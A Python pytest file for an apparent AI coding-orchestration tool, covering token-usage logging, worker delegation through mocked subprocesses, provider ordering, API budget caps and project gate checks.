def test_log_token_usage_writes_jsonl(tmp_path, monkeypatch):
    target = tmp_path / "token_usage.jsonl"
    monkeypatch.setattr(kb, "TOKEN_USAGE_FILE", target)

    kb.log_token_usage(
        provider="openrouter",
        model="qwen/qwen3-coder:free",
        operation="chat.completions.create",
        usage={"prompt_tokens": 11, "completion_tokens": 7, "total_tokens": 18},
        metadata={"stream": False},
    )

    assert target.exists()
    row = json.loads(target.read_text().strip().splitlines()[0])
    assert row["provider"] == "openrouter"
    assert row["model"] == "qwen/qwen3-coder:free"
    assert row["usage"]["total_tokens"] == 18


def test_get_builder_token_usage_aggregates_today(tmp_path, monkeypatch):
    target = tmp_path / "token_usage.jsonl"
    monkeypatch.setattr(kb, "TOKEN_USAGE_FILE", target)
    today = kb.datetime.now().strftime("%Y-%m-%d")
    rows = [
        {
            "ts": kb.datetime.now().isoformat(timespec="seconds"),
            "date": today,
            "provider": "openrouter",
            "model": "model-a",
            "operation": "chat.completions.create",
            "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15},
            "metadata": {"completion_chars": 20},
        },
        {
            "ts": kb.datetime.now().isoformat(timespec="seconds"),
            "date": today,
            "provider": "mlx",
            "model": "model-b",
            "operation": "stream_generate",
            "usage": {"prompt_tokens": 3, "completion_tokens": 2, "total_tokens": 5},
            "metadata": {"completion_chars": 12},
        },
    ]
    target.write_text("\n".join(json.dumps(r) for r in rows) + "\n")

    text = kb.get_builder_token_usage()

    assert "calls: 2" in text
    assert "total_tokens: 20" in text
    assert "completion_chars: 32" in text
    assert "model-a" in text


# ── kb_query (LightRAG opt-in) ───────────────────────────────────────────────

def test_kb_query_disabled_returns_error(monkeypatch):
    monkeypatch.setattr(kb, "USE_LIGHTRAG", False)
    out = kb.kb_query("anything")
    assert "LightRAG disabled" in out


# ── delegate() — real subprocess path (not LLM narrative) ─────────────────────


@pytest.fixture
def delegate_fast_path(monkeypatch):
    """Avoid scout/web/git during delegate() unit tests."""
    monkeypatch.setattr(kb, "github_scout", lambda task: "")
    monkeypatch.setattr(kb, "_worker_context", lambda task: f"CTX:{task}")
    monkeypatch.setattr(kb, "_delegate_packet_for_task", lambda task: {})
    monkeypatch.setattr(kb, "_git_snapshot", lambda: set())
    monkeypatch.setattr(kb, "_delegate_git_diff_stat_suffix", lambda: "")
    monkeypatch.setattr(kb, "record_builder_recommendation", lambda **kwargs: None)
    # subprocess.run uses Popen internally; patching Popen breaks git invocations.
    def _fake_run(*args, **kwargs):
        cmd = kwargs.get("args") or (args[0] if args else [])
        return kb.subprocess.CompletedProcess(cmd, 0, "", "")

    monkeypatch.setattr(kb.subprocess, "run", _fake_run)


def test_delegate_unknown_cli_does_not_spawn(delegate_fast_path, monkeypatch):
    def boom(*args, **kwargs):
        raise AssertionError("Popen must not run for unknown cli")

    monkeypatch.setattr(kb.subprocess, "Popen", boom)
    out = kb.delegate("not_a_real_worker", "hello")
    assert "Unknown worker" in out


def test_delegate_missing_binary_does_not_spawn(delegate_fast_path, monkeypatch):
    monkeypatch.setattr(kb, "_delegate_argv", lambda cli, ctx: None)

    def boom(*args, **kwargs):
        raise AssertionError("Popen must not run when binary is missing")

    monkeypatch.setattr(kb.subprocess, "Popen", boom)
    out = kb.delegate("crush", "hello")
    assert "CLI binary not found" in out


def test_delegate_calls_popen_streams_and_logs_banner(delegate_fast_path, monkeypatch, capsys):
    captured: dict = {}

    class _FakeStdout:
        __slots__ = ("_lines",)

        def __init__(self, lines: list[str]):
            self._lines = lines

        def __iter__(self):
            return iter(self._lines)

        def close(self) -> None:
            pass

    class FakeProc:
        returncode = 0

        def __init__(self):
            self.stdout = _FakeStdout(["worker-line\n"])

        def wait(self, timeout=None):
            return None

        def kill(self):
            pass

    def fake_popen(args, **kwargs):
        captured["args"] = list(args)
        captured["kwargs"] = kwargs
        return FakeProc()

    monkeypatch.setattr(kb.subprocess, "Popen", fake_popen)
    monkeypatch.setattr(
        kb,
        "_delegate_argv",
        lambda cli, ctx: ["/fake/bin/crush", "run", ctx],
    )

    summary = kb.delegate("crush", "sync maps")
    assert captured["args"] == ["/fake/bin/crush", "run", "CTX:sync maps"]
    assert captured["kwargs"].get("cwd") == kb.PROJECT_ROOT
    assert captured["kwargs"].get("shell", False) is False
    assert "Done (exit 0)" in summary

    err = capsys.readouterr().err
    assert "[delegate:crush]" in err
    assert "REAL subprocess" in err
    assert "executable='/fake/bin/crush'" in err
    assert "returncode=0" in err
    assert "stdout_lines=1" in err


def test_delegate_nonzero_exit_reports_failure(delegate_fast_path, monkeypatch):
    class _FakeStdout:
        __slots__ = ("_lines",)

        def __init__(self, lines: list[str]):
            self._lines = lines

        def __iter__(self):
            return iter(self._lines)

        def close(self) -> None:
            pass

    class FakeProc:
        returncode = 1

        def __init__(self):
            self.stdout = _FakeStdout(["err-line\n"])

        def wait(self, timeout=None):
            return None

        def kill(self):
            pass

    monkeypatch.setattr(kb.subprocess, "Popen", lambda *a, **k: FakeProc())
    monkeypatch.setattr(
        kb,
        "_delegate_argv",
        lambda cli, ctx: ["/fake/bin/crush", "run", ctx],
    )
    summary = kb.delegate("crush", "sync maps")
    assert "FAILED" in summary
    assert "exit code 1" in summary


def test_delegate_includes_next_agent_packet_context(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(kb, "github_scout", lambda task: "")
    monkeypatch.setattr(kb, "_worker_context", lambda task: f"CTX:{task}")
    monkeypatch.setattr(
        kb,
        "_delegate_packet_for_task",
        lambda task: {"schema_version": "builder_handoff.v1", "objective": "Ship thing"},
    )
    monkeypatch.setattr(kb, "_git_snapshot", lambda: set())
    monkeypatch.setattr(kb, "_delegate_git_diff_stat_suffix", lambda: "")
    monkeypatch.setattr(kb, "record_builder_recommendation", lambda **kwargs: None)

    class _FakeStdout:
        __slots__ = ("_lines",)

        def __init__(self, lines: list[str]):
            self._lines = lines

        def __iter__(self):
            return iter(self._lines)

    class FakeProc:
        returncode = 0

        def __init__(self):
            self.stdout = _FakeStdout(["worker-line\n"])

        def wait(self, timeout=None):
            return None

        def kill(self):
            pass

    def fake_popen(args, **kwargs):
        captured["args"] = list(args)
        return FakeProc()

    monkeypatch.setattr(kb.subprocess, "Popen", fake_popen)
    monkeypatch.setattr(kb, "_delegate_argv", lambda cli, ctx: ["/fake/bin/crush", "run", ctx])

    summary = kb.delegate("crush", "sync maps")
    assert "Done (exit 0)" in summary
    assert "NEXT_AGENT_PACKET_JSON" in captured["args"][-1]
    assert "schema_version" in captured["args"][-1]


def test_parse_brain_order_defaults(monkeypatch):
    monkeypatch.delenv("KITTY_BUILDER_BRAIN_ORDER", raising=False)
    assert kb._parse_brain_order() == ("openrouter", "mlx", "groq")


def test_parse_brain_order_custom(monkeypatch):
    monkeypatch.setenv("KITTY_BUILDER_BRAIN_ORDER", "mlx,openrouter")
    assert kb._parse_brain_order() == ("mlx", "openrouter")


def test_parse_brain_order_filters_unknown_tokens(monkeypatch):
    monkeypatch.setenv("KITTY_BUILDER_BRAIN_ORDER", "mlx,bogus,nn")
    assert kb._parse_brain_order() == ("mlx",)


def test_parse_brain_order_empty_falls_back(monkeypatch):
    monkeypatch.setenv("KITTY_BUILDER_BRAIN_ORDER", "bogus,xyz")
    assert kb._parse_brain_order() == ("openrouter", "mlx", "groq")


def test_estimate_openrouter_call_usd_free():
    assert kb._estimate_openrouter_call_usd("qwen/qwen3-coder:free") == 0.0


def test_estimate_openrouter_call_usd_paid_default(monkeypatch):
    monkeypatch.delenv("KITTY_BUDGET_OR_ESTIMATE_USD", raising=False)
    assert kb._estimate_openrouter_call_usd("anthropic/claude-3-haiku") == 0.002


def test_estimate_openrouter_call_usd_paid_env(monkeypatch):
    monkeypatch.setenv("KITTY_BUDGET_OR_ESTIMATE_USD", "0.05")
    assert kb._estimate_openrouter_call_usd("anthropic/claude-3-haiku") == 0.05


def test_openrouter_preflight_blocks_paid_when_at_cap(monkeypatch):
    monkeypatch.setattr(kb, "_openrouter_client", MagicMock())
    b = kb.BudgetManager()
    b.or_cap_usd = 0.01
    b.or_spend_usd = 0.01
    monkeypatch.setattr(kb, "budget", b)
    monkeypatch.setattr(
        kb,
        "_select_or_model",
        lambda explicit: ("anthropic/claude-3-haiku", False),
    )
    with pytest.raises(kb.BudgetExhausted):
        kb.call_openrouter([{"role": "user", "content": "x"}], max_attempts=1)
    kb._openrouter_client.chat.completions.create.assert_not_called()


def test_openrouter_preflight_allows_free_when_at_cap(monkeypatch):
    mock_client = MagicMock()
    mock_resp = MagicMock()
    mock_resp.choices = [MagicMock(message=MagicMock(content="ok"))]
    mock_client.chat.completions.create.return_value = mock_resp
    monkeypatch.setattr(kb, "_openrouter_client", mock_client)
    b = kb.BudgetManager()
    b.or_cap_usd = 0.01
    b.or_spend_usd = 0.01
    monkeypatch.setattr(kb, "budget", b)
    monkeypatch.setattr(
        kb,
        "_select_or_model",
        lambda explicit: ("qwen/qwen3-coder:free", True),
    )
    assert kb.call_openrouter([{"role": "user", "content": "x"}], max_attempts=1) == "ok"
    mock_client.chat.completions.create.assert_called_once()


def test_assert_groq_request_allowed_enforces_cap(monkeypatch, tmp_path):
    monkeypatch.setenv("KITTY_BUDGET_GROQ_MAX_REQUESTS", "2")
    monkeypatch.setattr(kb, "BUDGET_FILE", tmp_path / "nobudget.json")
    b = kb.BudgetManager()
    b.groq_requests = 2
    with pytest.raises(kb.BudgetExhausted) as excinfo:
        b.assert_groq_request_allowed()
    assert excinfo.value.code == "GROQ_DAILY_CAP"


# ── Builder session / gates / spec latch ───────────────────────────────────────


def test_builder_scope_block():
    assert kb._builder_scope_block({}) == ""
    text = kb._builder_scope_block({"builder_spec_path": "docs/nope_missing.md"})
    assert "SESSION SPEC LATCH" in text
    assert "docs/nope_missing.md" in text


def test_run_project_gates_pass(monkeypatch):
    monkeypatch.setattr(kb, "run_trusted_bash_script", lambda rel: "tests ok\n")
    out = kb.run_project_gates()
    assert "PASS" in out


def test_run_project_gates_fail(monkeypatch):
    monkeypatch.setattr(
        kb,
        "run_trusted_bash_script",
        lambda rel: "Command exited with code 2:\nboom",
    )
    out = kb.run_project_gates()
    assert "FAIL" in out
    assert "code 2" in out


def test_update_project_from_scan_preserves_goal_and_spec(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    minimal = {
        "project_name": "T",
        "description": "",
        "milestones": [],
        "backlog": [],
        "notes": "",
        "progress": {
            "total_tasks": 0,
            "completed_tasks": 0,
            "remaining_tasks": 0,
            "task_completion_pct": 0.0,
            "total_milestones": 0,
            "completed_milestones": 0,
            "milestone_completion_pct": 0.0,
            "open_todos": 0,
        },
        "context_files": [],
        "git_info": {"status": "", "recent_commits": []},
        "open_todos": [],
    }
    monkeypatch.setattr(kb, "build_project_state", lambda: dict(minimal))
    kb.session.project_state = {
        **minimal,
        "builder_spec_path": "docs/plan.md",
        "goal_verify": "pytest -q",
    }
    kb.update_project_from_scan()
    assert kb.session.project_state.get("builder_spec_path") == "docs/plan.md"
    assert kb.session.project_state.get("goal_verify") == "pytest -q"
    assert kb.session.project_state.get("project_name") == "T"


def test_builder_session_start_brief_has_core_sections(monkeypatch):
    monkeypatch.setattr(kb, "update_project_from_scan", lambda: None)
    kb.session.project_state = {
        "milestones": [],
        "backlog": [],
        "progress": {},
        "open_todos": [],
    }
    monkeypatch.setattr(kb, "suggest_next_steps", lambda: "## Recommended Next Steps\n\nnoop")
    text = kb.builder_session_start_brief()
    assert "Builder session start" in text
    assert "Budget:" in text
    assert "CURRENT_FOCUS" in text
    assert "## Recommended Next Steps" in text


def test_compile_builder_request_returns_brief(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_ROOT", tmp_path)
    (tmp_path / "CURRENT_FOCUS.md").write_text("# Current Focus\n", encoding="utf-8")
    text = kb.compile_builder_request("continue command system and verify")
    assert "recommended_execution_mode" in text
    assert "normalized_goal" in text
    assert "next_agent_packet" in text


def test_worker_health_summary_marks_missing(monkeypatch):
    monkeypatch.setattr(kb, "_DELEGATE_ORDER", ("definitely-missing-worker",))
    text = kb.worker_health_summary()
    assert "definitely-missing-worker" in text
    assert "missing" in text.lower()


def test_record_builder_recommendation_writes_ledger(tmp_path, monkeypatch):
    target = tmp_path / "builder_evidence.jsonl"
    monkeypatch.setattr(kb, "BUILDER_EVIDENCE_FILE", target)
    kb.record_builder_recommendation(
        raw_input="continue command work",
        outcome="compiled",
        workers=["single_worker"],
        commands_run=["bash scripts/run_gates.sh"],
        risks=[],
        next_agent_packet={"schema_version": "builder_handoff.v1", "objective": "x"},
    )
    assert target.exists()
    content = target.read_text(encoding="utf-8")
    assert "continue command work" not in content
    assert "compiled" in content
    assert "next_agent_packet" in content
